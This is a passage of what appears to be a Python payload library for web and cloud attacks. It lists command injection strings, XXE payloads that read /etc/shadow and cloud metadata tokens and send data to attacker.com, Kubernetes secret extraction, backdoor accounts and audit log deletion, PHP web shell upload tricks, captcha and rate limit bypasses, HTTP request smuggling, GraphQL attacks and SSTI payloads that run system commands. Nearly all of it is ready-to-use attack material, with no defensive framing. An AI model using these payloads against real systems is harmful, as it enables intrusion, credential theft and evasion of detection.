    "/bin/sh -c id",
    "/bin/bash -c id",
    "/usr/bin/id",
    "%0aid",
    "%0a id",
    "%0d%0aid",
    "%0a%0did",
    "%0aidcd%0a",
    "%0a/usr/bin/id%0a",
    "|%0aid",
    ";%0aid",
    "&%0aid",
    "&&%0aid",
    "||%0aid",
    "${IFS}id",
    "$IFS$9id",
    "${IFS}cat${IFS}/etc/passwd",
    "$IFS$9cat$IFS$9/etc/passwd",
    "i%60d",
    "i$(echo%20)d",
    "i`echo`d",
    "\"$( id)\"",
    "'$( id)'",
    "\"$(id)\"",
    "'$(id)'",
    "id\n",
    "id\r",
    "id\r\n",
    "id%0a",
    "id%0d",
    "id%0d%0a",
    "id;",
    ";id;",
    ";id\n",
    "id #",
    "id # comment",
    "id //",
    "id /* comment */",
]


                                                                                 
                        
                                                                                 

EXTENDED_XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd"><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo/>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">%all;]><foo>&send;</foo>""",
    """<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
    """<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///C:/Windows/win.ini" >]><foo>&xxe;</foo>""",
    """<!DOCTYPE foo [<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&ac;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><root>&test;</root>""",
]



                                                                                 
                                   
                                                                                 

HASH_CRACKING_REFERENCE = {
    "MD5": {
        "length": 32,
        "example": "5f4dcc3b5aa765d61d8327deb882cf99",
        "hashcat_mode": 0,
        "john_format": "raw-md5",
        "note": "Password = 'password'. Extremely fast to crack. Avoid for password storage.",
        "online_tools": ["https://crackstation.net","https://md5decrypt.net",
                         "https://hashtoolkit.com","https://hashes.com/en/decrypt/hash"],
    },
    "SHA1": {
        "length": 40,
        "example": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
        "hashcat_mode": 100,
        "john_format": "raw-sha1",
        "note": "Password = 'password'. Fast to crack. Not recommended for passwords.",
        "online_tools": ["https://crackstation.net","https://sha1.gromweb.com"],
    },
    "SHA256": {
        "length": 64,
        "example": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
        "hashcat_mode": 1400,
        "john_format": "raw-sha256",
        "note": "Password = 'password'. Slower than MD5/SHA1 but still crackable with GPU.",
        "online_tools": ["https://crackstation.net","https://hashes.com/en/decrypt/hash"],
    },
    "SHA512": {
        "length": 128,
        "example": "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86",
        "hashcat_mode": 1700,
        "john_format": "raw-sha512",
        "note": "Password = 'password'. Slow without GPU.",
        "online_tools": ["https://crackstation.net"],
    },
    "bcrypt": {
        "length": 60,
        "example": "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi",
        "hashcat_mode": 3200,
        "john_format": "bcrypt",
        "note": "Very slow. Cost factor adjustable. Recommended for passwords.",
        "online_tools": ["Offline only — hashcat/john required"],
    },
    "scrypt": {
        "length": "variable",
        "example": "$scrypt$N=32768,r=8,p=1$...",
        "hashcat_mode": 8900,
        "john_format": "scrypt",
        "note": "Memory-hard. Designed to resist GPU/ASIC attacks.",
        "online_tools": ["Offline only"],
    },
    "Argon2": {
        "length": "variable",
        "example": "$argon2id$v=19$m=65536,t=2,p=4$...",
        "hashcat_mode": 13400,
        "john_format": "argon2",
        "note": "Memory-hard. Best current practice for password hashing.",
        "online_tools": ["Offline only"],
    },
    "PBKDF2-SHA256": {
        "length": "variable",
        "example": "pbkdf2_sha256$260000$...",
        "hashcat_mode": 20300,
        "john_format": "pbkdf2-hmac-sha256",
        "note": "Django default since 4.0. Recommended.",
        "online_tools": ["Offline only"],
    },
    "MD5crypt": {
        "length": 34,
        "example": "$1$salt$hash",
        "hashcat_mode": 500,
        "john_format": "md5crypt",
        "note": "Linux/BSD MD5-based crypt. Still seen in older systems.",
        "online_tools": ["Offline only"],
    },
    "SHA512crypt": {
        "length": "variable",
        "example": "$6$salt$hash",
        "hashcat_mode": 1800,
        "john_format": "sha512crypt",
        "note": "Modern Linux /etc/shadow default. Slow enough to require GPU.",
        "online_tools": ["Offline only"],
    },
    "SHA256crypt": {
        "length": "variable",
        "example": "$5$salt$hash",
        "hashcat_mode": 7400,
        "john_format": "sha256crypt",
        "note": "Linux /etc/shadow SHA256 variant.",
        "online_tools": ["Offline only"],
    },
    "NTLM": {
        "length": 32,
        "example": "8846f7eaee8fb117ad06bdd830b7586c",
        "hashcat_mode": 1000,
        "john_format": "nt",
        "note": "Windows password hash. Very fast. Often found in SAM/NTDS.",
        "online_tools": ["https://crackstation.net","https://hashes.com"],
    },
    "LM": {
        "length": 32,
        "example": "aad3b435b51404eeaad3b435b51404ee",
        "hashcat_mode": 3000,
        "john_format": "lm",
        "note": "Legacy Windows. Disabled by default in Vista+. Trivially crackable.",
        "online_tools": ["https://crackstation.net"],
    },
    "NTLMv2": {
        "length": "variable",
        "example": "user::DOMAIN:...:hash",
        "hashcat_mode": 5600,
        "john_format": "netntlmv2",
        "note": "NetNTLMv2 challenge-response. Captured via Responder.",
        "online_tools": ["https://hashes.com"],
    },
    "NetNTLMv1": {
        "length": "variable",
        "example": "user::DOMAIN:...",
        "hashcat_mode": 5500,
        "john_format": "netntlm",
        "note": "Legacy challenge-response. Captured via Responder.",
        "online_tools": ["Offline only"],
    },
    "Kerberos AS-REP": {
        "length": "variable",
        "example": "$krb5asrep$23$...",
        "hashcat_mode": 18200,
        "john_format": "krb5asrep",
        "note": "AS-REP Roasting. Accounts with pre-auth disabled.",
        "online_tools": ["Offline only"],
    },
    "Kerberoast": {
        "length": "variable",
        "example": "$krb5tgs$23$*...",
        "hashcat_mode": 13100,
        "john_format": "krb5tgs",
        "note": "Kerberoasting service ticket hash. TGS-REP.",
        "online_tools": ["Offline only"],
    },
    "MySQL 4.1+": {
        "length": 41,
        "example": "*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19",
        "hashcat_mode": 300,
        "john_format": "mysql-sha1",
        "note": "MySQL password_hash() function.",
        "online_tools": ["https://crackstation.net"],
    },
    "MySQL 3.x": {
        "length": 16,
        "example": "6f8c114b58f2ce9e",
        "hashcat_mode": 200,
        "john_format": "mysql",
        "note": "Old MySQL password format. Very fast.",
        "online_tools": ["https://crackstation.net"],
    },
    "PostgreSQL MD5": {
        "length": 35,
        "example": "md5be86a79bf2043622d58d5453c47d4860",
        "hashcat_mode": 11600,
        "john_format": "postgres",
        "note": "PostgreSQL md5 + username + password format.",
        "online_tools": ["Offline only"],
    },
    "WordPress": {
        "length": 34,
        "example": "$P$BIqLogVaqgWhLuKF/KnTR0N.lqA/",
        "hashcat_mode": 400,
        "john_format": "phpass",
        "note": "Phpass portable hash. Also used by Joomla, Drupal 7.",
        "online_tools": ["Offline only — hashcat mode 400"],
    },
    "Drupal 7": {
        "length": 55,
        "example": "$S$5EMDEAKlHVFaHHMxC3dC8hT.xbq1MfuoO8MoRTDJRJEbRmKKCQKo",
        "hashcat_mode": 7900,
        "john_format": "drupal7",
        "note": "SHA512 + salt iterated 16384x.",
        "online_tools": ["Offline only"],
    },
    "Joomla": {
        "length": 65,
        "example": "hash:salt",
        "hashcat_mode": 11,
        "john_format": "md5ns",
        "note": "Joomla < 2.5.18: MD5 with salt.",
        "online_tools": ["https://crackstation.net"],
    },
    "Django SHA1": {
        "length": "variable",
        "example": "sha1$salt$hash",
        "hashcat_mode": 124,
        "john_format": "django",
        "note": "Older Django default. Deprecated.",
        "online_tools": ["Offline only"],
    },
    "APR MD5": {
        "length": 37,
        "example": "$apr1$salt$hash",
        "hashcat_mode": 1600,
        "john_format": "md5crypt-long",
        "note": "Apache .htpasswd MD5 format.",
        "online_tools": ["Offline only"],
    },
    "SHA1-Base64": {
        "length": 28,
        "example": "W6ph5Mm5Pz8GgiULbPgzG37mj9g=",
        "hashcat_mode": 101,
        "john_format": "raw-sha1,b64",
        "note": "Base64-encoded SHA1. Often seen in older web apps.",
        "online_tools": ["https://crackstation.net"],
    },
}

                                                                                 
                                 
                                                                                 

IDOR_TEST_PATTERNS = {
    "numeric_increment": [
        "/api/v1/users/1","/api/v1/users/2","/api/v1/users/3",
        "/api/v1/users/100","/api/v1/users/1000","/api/v1/users/9999",
        "/api/v1/orders/1","/api/v1/orders/2","/api/v1/orders/100",
        "/api/v1/invoices/1","/api/v1/invoices/2","/api/v1/invoices/100",
        "/api/v1/messages/1","/api/v1/messages/2",
        "/api/v1/documents/1","/api/v1/documents/2",
        "/api/v1/reports/1","/api/v1/reports/2",
        "/admin/users/1","/admin/users/2","/admin/users/0",
        "/profile/1","/profile/2","/profile/0","/profile/100",
        "/download?file_id=1","?id=1","?id=2","?id=0","?id=-1",
        "?user_id=1","?user_id=2","?order_id=1","?invoice_id=1",
        "?account_id=1","?account_id=0","?account_id=-1",
        "?document_id=1","?document_id=2","?report_id=1",
    ],
    "guid_patterns": [
        "/api/v1/users/00000000-0000-0000-0000-000000000001",
        "/api/v1/users/00000000-0000-0000-0000-000000000002",
        "/api/v1/users/11111111-1111-1111-1111-111111111111",
        "/api/v1/users/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
        "?id=00000000-0000-0000-0000-000000000001",
        "?uuid=00000000-0000-0000-0000-000000000001",
        "?token=00000000-0000-0000-0000-000000000001",
    ],
    "parameter_pollution": [
        "?user_id=1&user_id=2",
        "?id=1&id=2",
        "?account=me&account=admin",
        "?role=user&role=admin",
        "?permission=read&permission=write",
    ],
    "mass_assignment_fields": [
        "isAdmin","is_admin","admin","role","roles",
        "permission","permissions","group","groups",
        "plan","tier","subscription","level","verified",
        "email_verified","phone_verified","active","enabled",
        "approved","banned","locked","deleted","archived",
        "balance","credit","points","quota","limit",
        "price","discount","amount","total","paid",
    ],
    "path_based": [
        "/users/{own_id}/private",
        "/users/{other_id}/private",
        "/users/{own_id}/messages/{msg_id}",
        "/users/{other_id}/messages/{msg_id}",
        "/admin/users/{own_id}",
        "/api/v1/me/../{other_id}",
        "/api/v1/me/../../admin",
    ],
    "header_based": [
        "X-User-ID: 1",
        "X-User-ID: 2",
        "X-Account-ID: 1",
        "X-Account-ID: 2",
        "X-User: admin",
        "X-Role: admin",
        "X-Admin: true",
        "X-Permission: write",
        "X-Override-User: 1",
        "X-Forwarded-User: admin",
        "X-Original-User: admin",
        "X-Impersonate-User: admin",
        "X-Act-As: admin",
    ],
    "jwt_manipulation": [
        "Change sub/user_id claim to other user's ID",
        "Change role/roles to 'admin'",
        "Change permissions to include 'admin'",
        "Change email to admin's email",
        "Set exp to far future",
        "Try alg:none",
        "Try weak HS256 secret",
        "Try RS256 to HS256 algorithm confusion",
    ],
}

                                                                                 
                                         
                                                                                 

OAUTH_TEST_CHECKLIST = [
    "1. Open redirect in redirect_uri parameter",
    "2. CSRF via missing or weak state parameter",
    "3. Authorization code reuse (no one-time use enforcement)",
    "4. Token leakage via Referer header",
    "5. Token in URL fragment exposed to JS",
    "6. Implicit flow returning access token in URL (deprecated)",
    "7. Insufficient redirect_uri validation (path traversal, wildcards)",
    "8. redirect_uri override via parameter pollution",
    "9. PKCE not implemented or S256 downgrade to plain",
    "10. Authorization code interception via open redirect chain",
    "11. Client credentials exposed in JavaScript source",
    "12. client_secret leak in mobile app binary",
    "13. Token endpoint not requiring client authentication",
    "14. Token scope escalation — requesting broader scope",
    "15. Token privilege escalation via scope manipulation",
    "16. Cross-tenant token usage (tenant isolation failure)",
    "17. ID token not validated (exp, iss, aud, nonce)",
    "18. JWT signature not verified server-side",
    "19. alg:none JWT accepted",
    "20. Weak HMAC secret for JWT signing",
    "21. RS256 to HS256 algorithm confusion",
    "22. access token not invalidated on logout",
    "23. Refresh token not rotated on use",
    "24. Refresh token not invalidated on password change",
    "25. Account linking without confirmation (pre-account takeover)",
    "26. Forced linking without binding current session",
    "27. Login CSRF via state-less OAuth flow",
    "28. OAuth provider accepts self-registered apps with any redirect_uri",
    "29. Insufficient validation of identity from OAuth provider",
    "30. Email from OAuth provider trusted without verification",
    "31. Sub-domain takeover to capture OAuth redirect",
    "32. HTTP instead of HTTPS for OAuth redirect",
    "33. Token stored in localStorage (XSS risk)",
    "34. Token stored in sessionStorage (XSS risk)",
    "35. Token stored in cookie without HttpOnly flag",
    "36. Token stored in cookie without Secure flag",
    "37. Token stored in cookie without SameSite attribute",
    "38. Overly broad CORS on token endpoint",
    "39. Token introspection endpoint open without auth",
    "40. OpenID Connect discovery endpoint leaks sensitive config",
    "41. userinfo endpoint returns sensitive data without proper auth",
    "42. Logout endpoint does not revoke tokens",
    "43. Silent authentication allows session hijack",
    "44. id_hint_token reuse attack",
    "45. login_hint parameter injection",
    "46. prompt=none bypass",
    "47. Third-party iframe authorization flow (postMessage CSRF)",
    "48. Device authorization grant without rate limiting",
    "49. Device authorization grant code not invalidated after use",
    "50. Insufficient token expiry — extremely long-lived tokens",
]

                                                                                 
                                                  
                                                                                 

K8S_ATTACK_PATHS = {
    "recon": [
        "kubectl get pods --all-namespaces",
        "kubectl get secrets --all-namespaces",
        "kubectl get configmaps --all-namespaces",
        "kubectl get serviceaccounts --all-namespaces",
        "kubectl get roles,rolebindings,clusterroles,clusterrolebindings --all-namespaces",
        "kubectl get networkpolicies --all-namespaces",
        "kubectl get ingress --all-namespaces",
        "kubectl get namespaces",
        "kubectl get nodes",
        "kubectl describe node <node>",
        "kubectl get events --all-namespaces",
        "kubectl auth can-i --list",
        "kubectl auth can-i --list --as=system:serviceaccount:default:default",
    ],
    "secret_extraction": [
        "kubectl get secret <name> -o jsonpath={.data}",
        "kubectl get secret <name> -o yaml | base64 -d",
        "kubectl exec <pod> -- env | grep -i 'pass\\|key\\|token\\|secret'",
        "kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "kubectl exec <pod> -- cat /proc/self/environ",
        "kubectl exec <pod> -- find / -name '*.env' 2>/dev/null",
        "kubectl exec <pod> -- find / -name 'config' 2>/dev/null",
        "kubectl exec <pod> -- find / -name '*.conf' 2>/dev/null",
    ],
    "privilege_escalation": [
        "Abuse impersonation: kubectl auth can-i list secrets --as system:admin",
        "Token from SA: curl -H 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/v1/",
        "Exec to privileged pod → mount hostPath",
        "Pod with hostNetwork:true → access host network services",
        "Pod with hostPID:true → access host processes",
        "Pod with privileged:true → mount host filesystem",
        "Create pod with host mounts to read node secrets",
        "Abuse RBAC: pods/exec privilege → exec to privileged pods",
        "Abuse RBAC: secrets/get → read all secrets",
        "Abuse RBAC: cluster-admin binding → full cluster access",
        "DaemonSet abuse → deploy to all nodes",
        "Node bootstrap token abuse → create SA tokens",
        "kubelet API port 10250 (unauthenticated access if misconfigured)",
        "etcd port 2379 (unauthenticated access → all cluster data)",
        "kube-apiserver port 8080 (insecure API, deprecated but seen)",
        "Dashboard exposed without auth",
    ],
    "lateral_movement": [
        "Service account token → access other namespaces",
        "Pod SSRF → metadata endpoint → IAM credentials",
        "Pod with cloud provider IAM role → cloud privilege escalation",
        "Network policy bypass → reach databases/services",
        "Sidecar injection → intercept traffic between pods",
        "DNS poisoning within cluster",
        "Service mesh misconfiguration → mTLS bypass",
        "Istio JWT bypass → unauthenticated service access",
    ],
    "persistence": [
        "Create backdoor service account with cluster-admin",
        "Create backdoor ClusterRoleBinding",
        "Deploy DaemonSet to all nodes",
        "Inject init container into existing deployments",
        "Modify admission webhooks",
        "Compromise registry → inject malicious image",
        "Create cron job for persistence",
        "Modify ConfigMap used by control plane",
    ],
    "detection_evasion": [
        "Use legitimate SA token → lower anomaly score",
        "Spread requests over time → avoid rate-limit triggers",
        "Target pods in default namespace → less monitoring",
        "Use built-in utilities (curl, wget) → avoid binary drops",
        "Disable audit logging if API access permits",
        "Modify or delete audit log entries",
        "Use ephemeral containers → less traceability",
        "Exec inside existing pod → blend with normal traffic",
    ],
}

                                                                                 
                                         
                                                                                 

FILE_UPLOAD_BYPASS = {
    "extension_bypass": [
        "php → php3, php4, php5, php7, php8, phtml, pht, php.jpg",
        "asp → aspx, asa, cer, cdx, htaccess, config",
        "jsp → jspx, jsw, jsv, jspf",
        "Double extension: shell.php.jpg, shell.php.png, shell.php.",
        "Null byte: shell.php%00.jpg, shell.php\x00.jpg",
        "Case variation: shell.PHP, shell.Php, shell.pHp",
        "Add valid extension before: shell.jpg.php",
        "Trailing dots: shell.php., shell.php..",
        "Special chars: shell.php::$DATA (Windows)",
        "Unicode variation: shell.ⅰnc.php",
    ],
    "content_type_bypass": [
        "Change Content-Type to image/jpeg",
        "Change Content-Type to image/png",
        "Change Content-Type to image/gif",
        "Change Content-Type to application/octet-stream",
        "Add valid image MIME + wrong extension",
        "Burp: intercept → change Content-Type in transit",
    ],
    "magic_bytes_bypass": [
        "Prepend GIF89a to PHP: GIF89a<?php system($_GET['cmd']); ?>",
        "Prepend JPEG magic: \\xff\\xd8\\xff<?php system($_GET['cmd']); ?>",
        "Prepend PNG magic: \\x89PNG\\r\\n\\x1a\\n<?php ...",
        "Prepend PDF magic: %PDF-1.4<?php ...",
        "Prepend ZIP magic: PK\\x03\\x04<?php ...",
        "exiftool injection: exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' img.jpg",
        "EXIF data injection: embed PHP in EXIF fields",
    ],
    "htaccess_abuse": [
        "Upload .htaccess to force PHP execution of .jpg files",
        ".htaccess: AddType application/x-httpd-php .jpg",
        ".htaccess: SetHandler application/x-httpd-php for all files",
        ".htaccess: Options +ExecCGI, AddHandler cgi-script .jpg",
        ".htaccess: php_value auto_prepend_file /etc/passwd",
        ".htaccess: php_flag engine on + custom extension mapping",
        "web.config: map .jpg to ASP handler (IIS)",
    ],
    "path_traversal_upload": [
        "Filename: ../../evil.php",
        "Filename: ../../../var/www/html/evil.php",
        "Filename: %2e%2e%2f%2e%2e%2fevil.php",
        "Filename: ..%2F..%2Fevil.php",
        "Filename: ....//....//evil.php",
        "Filename: evil.php\\x00.jpg (null byte)",
        "multipart boundary manipulation",
    ],
    "race_condition": [
        "Upload file → delete before validation → exec window",
        "Upload PHP → immediately request before antivirus scan",
        "Race: POST upload + GET exec in parallel threads",
        "temp file race: predict /tmp/phpXXXXXX name",
    ],
    "image_shell": [
        "imageshell.php.jpg: valid JPEG with embedded PHP",
        "polyglot: valid GIF + PHP code — executed as PHP, viewed as GIF",
        "SVG with embedded JavaScript/PHP",
        "PDF with embedded JavaScript (XSS via PDF viewer)",
        "ZIP bomb: nested ZIPs to consume server resources",
        "CSV injection: formula injection in CSV uploads",
    ],
}

                                                                                 
                                                     
                                                                                 

RATE_LIMIT_BYPASS = {
    "header_tricks": [
        "X-Forwarded-For: <random IP>",
        "X-Real-IP: <random IP>",
        "True-Client-IP: <random IP>",
        "Client-IP: <random IP>",
        "Fastly-Client-IP: <random IP>",
        "CF-Connecting-IP: <random IP>",
        "X-Cluster-Client-IP: <random IP>",
        "X-Custom-IP-Authorization: <random IP>",
        "X-ProxyUser-Ip: <random IP>",
        "X-Originating-IP: <random IP>",
        "Forwarded: for=<random IP>",
        "X-Azure-ClientIP: <random IP>",
        "X-Remote-IP: <random IP>",
        "X-Remote-Addr: <random IP>",
        "X-Host: <random IP>",
        "X-Forwarded-Host: <random IP>",
    ],
    "request_variation": [
        "Add trailing slash: /login vs /login/",
        "Add query param: /login?x=1, /login?x=2",
        "Add fragment: /login#1, /login#2",
        "URL encode path: /log%69n vs /login",
        "Case variation: /Login, /LOGIN",
        "Double slash: //login",
        "Add Accept-Language header variation",
        "Add User-Agent rotation",
        "Change Content-Type between requests",
        "Change HTTP version: HTTP/1.0 vs HTTP/1.1 vs HTTP/2",
    ],
    "captcha_bypass": [
        "Reuse solved captcha token multiple times",
        "Old token replay — check if exp is validated",
        "Audio captcha → speech-to-text (Google API)",
        "reCAPTCHA v2 token purchase via 2captcha/anticaptcha",
        "hCaptcha token purchase via 2captcha",
        "OCR tools for simple image captchas",
        "reCAPTCHA v3 — score manipulation via headless browser",
        "Remove captcha field from request entirely",
        "Null/empty captcha response accepted by server",
        "Captcha only validated on first request in session",
        "Captcha validated client-side only",
    ],
    "account_enumeration": [
        "Timing difference in response for valid vs invalid username",
        "Different error messages: 'Wrong password' vs 'User not found'",
        "HTTP status difference: 200 vs 404",
        "Response size difference for valid vs invalid username",
        "Different redirect behavior",
        "Password reset: 'email sent' vs 'email not found'",
        "Registration: 'email already in use' vs 'registration successful'",
        "Login endpoint returns username in response on failure",
        "Anti-CSRF token varies based on account existence",
    ],
}

                                                                                 
                                           
                                                                                 

HTTP_SMUGGLING_PAYLOADS = {
    "CL_TE": (
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    ),
    "TE_CL": (
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "8\r\n"
        "SMUGGLED\r\n"
        "0\r\n"
        "\r\n"
    ),
    "TE_TE_obfuscation": (
        "Transfer-Encoding: xchunked\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: x\r\n"
        "Transfer-Encoding: identity\r\n"
        "Transfer-Encoding : chunked\r\n"
        "\tTransfer-Encoding: chunked\r\n"
        "X: X\\nTransfer-Encoding: chunked\r\n"
    ),
    "h2_downgrade": (
        "HTTP/2 request smuggled via downgrade to HTTP/1.1\n"
        "Inject CRLF via pseudo-headers\n"
        "Inject transfer-encoding in HTTP/2 headers\n"
        "Content-Length mismatch across h2/h1 boundary\n"
        "H2.0 request tunneling via CONNECT pseudo-method"
    ),
    "cache_poisoning_via_smuggling": (
        "Smuggle request to poison cache entry for another user\n"
        "Cause front-end to cache back-end response from smuggled request\n"
        "Deliver reflected XSS to cached page via smuggled request"
    ),
    "response_queue_poisoning": (
        "Smuggle full HTTP/1.1 response to intercept another user's response\n"
        "Cause victim to receive attacker-controlled response\n"
        "Cookie theft, session hijacking, redirect attacks via poisoned queue"
    ),
}

                                                                                 
                                     
                                                                                 

GRAPHQL_ATTACK_TECHNIQUES = {
    "introspection": [
        '{"query":"{ __schema { types { name } } }"}',
        '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}',
        '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
        '{"query":"{ __schema { types { name kind fields { name args { name type { name ofType { name } } } } } } }"}',
        '{"query":"fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }"}',
    ],
    "injection": [
        '{"query":"{ users(name: \\"admin\\") { id password } }"}',
        '{"query":"{ user(id: 1) { id email password apiKey } }"}',
        '{"query":"{ users { id email password roles { name } } }"}',
        '{"query":"{ searchUsers(query: \\"\\") { id email password } }"}',
        '{"query":"{ user(id: \\"1 OR 1=1\\") { id } }"}',
    ],
    "batching_attack": [
        '[{"query":"{ user(id: 1) { password } }"},{"query":"{ user(id: 2) { password } }"},{"query":"{ user(id: 3) { password } }"}]',
        "Batch 1000+ queries in single request to bypass rate limiting",
        "Alias brute-force: a1:login(user:u1,pass:p1) a2:login(user:u1,pass:p2) ...",
    ],
    "dos": [
        "Deeply nested query: { a { a { a { a { a { ... } } } } } }",
        "Query with circular fragments",
        "Large batch request — 10000 queries",
        "Extremely wide query — all fields on all types",
        "Query complexity limit not enforced",
        "Query depth limit not enforced",
        "Introspection enabled in production (info disclosure + map for attacks)",
    ],
    "field_suggestions": [
        "Exploit suggestion feature: typo in field name returns suggestions",
        "Clairvoyance tool: guess field names from error messages",
        "Reveal hidden fields via __type and field enumeration",
    ],
    "ssrf_via_graphql": [
        '{"query":"{ fetchUrl(url: \\"http://169.254.169.254/latest/meta-data/\\") }"}',
        '{"query":"{ importData(source: \\"file:///etc/passwd\\") { result } }"}',
        '{"query":"{ sendWebhook(url: \\"http://127.0.0.1:6379/\\") { result } }"}',
    ],
    "auth_bypass": [
        "Query fields that should require auth without sending token",
        "Mutation to change another user's password without auth check",
        "Use subscription endpoint instead of query to bypass auth middleware",
        "Use alias to call restricted mutation under unrestricted name",
        "Use fragments to access forbidden fields",
        "Introspection to find undocumented admin mutations",
    ],
}



                                                                                 
                                                                             
                                                                                 

EXTENDED_SSTI_PAYLOADS_2 = [
               
    "{{7*7}}","${7*7}","{7*7}","<%= 7*7 %>","#{7*7}","*{7*7}",
    "{{7*'7'}}","${7*'7'}","{{7*7}}","@(7*7)","${{7*7}}",
    "{{config}}","{{self}}","{{request}}","{{application}}",
                     
    "{{config.items()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.class.mro()[1].subclasses()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{% for c in [1,2,3] %}{{c}}{% endfor %}",
    "{% raw %}{{7*7}}{% endraw %}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
                
    "{{7*7}}","{{7*'7'}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('system')}}",
    "{{['cat /etc/passwd']|filter('system')}}",
    "{{['id']|map('system')|join}}",
    "{{'id'|passthru}}",
    "{{app.request.server.all|join(',')}}",
                       
    "${7*7}","#{7*7}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "${\".class\".forName(\"java.lang.Runtime\").getMethod(\"exec\",\".class\"[]).invoke(\".class\".forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),[[\"id\"]])}",
    "<#assign classLoader=object?api.class.protectionDomain.classLoader>",
                     
    "#set($x='')##${$x.class.forName('java.lang.Runtime').getMethod('exec',''.class[]).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
    "#set($str=$class.inspect(\"java.lang.String\").type)",
                  
    "{$smarty.version}",
